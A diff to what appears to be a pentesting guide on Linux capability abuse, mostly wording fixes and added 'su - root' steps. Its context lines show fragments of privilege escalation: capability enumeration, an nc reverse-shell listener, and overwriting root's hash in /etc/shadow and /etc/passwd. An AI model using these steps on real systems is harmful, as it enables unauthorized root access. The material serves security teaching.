@@ -350,7 +350,7 @@ This could lead to trivial privilege escalation and ring-0 compromise. The kerne
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the binary **`python`** has this capability.
+In the following example the **`python`** binary has this capability.
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -436,7 +436,7 @@ nc -lvnp 4444
 {% endtab %}
 
 {% tab title="Exploit -  kmod" %}
-In the following example the binary **`kmod`** has this capability.
+In the following example the **`kmod`** binary has this capability.
 
 ```bash
 getcap -r / 2>/dev/null
@@ -521,7 +521,7 @@ Any process with the capability `CAP_DAC_READ_SEARCH` can use `open_by_handle_at
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the binary **`python`** has this capability.&#x20;
+In the following example the **`python`** binary has this capability.&#x20;
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -539,7 +539,7 @@ $ python3.11 exploit.py
 {% endtab %}
 
 {% tab title="Exploit - Tar" %}
-In the following example the binary **`tar`** has this capability.&#x20;
+In the following example the **`tar`** binary has this capability.&#x20;
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -574,7 +574,7 @@ tar -cxf shadow.tar.gz
 {% endtab %}
 
 {% tab title="Exploit - Python" %}
-In the following example the binary **`python`** has this capability.&#x20;
+In the following example the **`python`** binary has this capability.&#x20;
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -643,7 +643,7 @@ $ head -n1 /etc/passwd
 root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:0:0:root:/root:/usr/bin/zsh
 ```
 
-We can now easly `su` as root
+We can now easily `su` as root
 
 ```bash
 su - root
@@ -651,7 +651,7 @@ su - root
 {% endtab %}
 
 {% tab title="Exploit Vim" %}
-In the following example the binary **`vim`** has this capability.&#x20;
+In the following example the **`vim`** binary has this capability.&#x20;
 
 ```bash
 $ getcap -r / 2>/dev/null
@@ -679,8 +679,7 @@ $ head -n1 /etc/shadow
 root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
 ```
 
-We can now easly `su` as root
-
+We can now easily `su` as root
 ```bash
 su - root
 ```
@@ -738,6 +737,11 @@ $ vim /etc/shadow
 $ head -n1 /etc/shadow
 root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
 ```
+
+We can now easily `su` as root
+```bash
+su - root
+```
 {% endtab %}
 {% tab title="Exploit - Ruby" %}
 In the following example the **`ruby`** binary has this capability.&#x20;
@@ -780,6 +784,11 @@ And edit the `/etc/shadow` file to change the root password
 $ vim /etc/shadow
 $ head -n1 /etc/shadow
 root:$6$saltsalt$rGHbrrsOT1WLTt4dcfZKq1FiG//1B7ZAMkD.MeAC8/d9MOtB5EzYEffFnBarQhF6MiLywY/KggaYjrNNrzAnj/:17673:0:99999:7:::
+```
+
+We can now easily `su` as root
+```bash
+su - root
 ```
 {% endtab %}
 {% endtabs %}
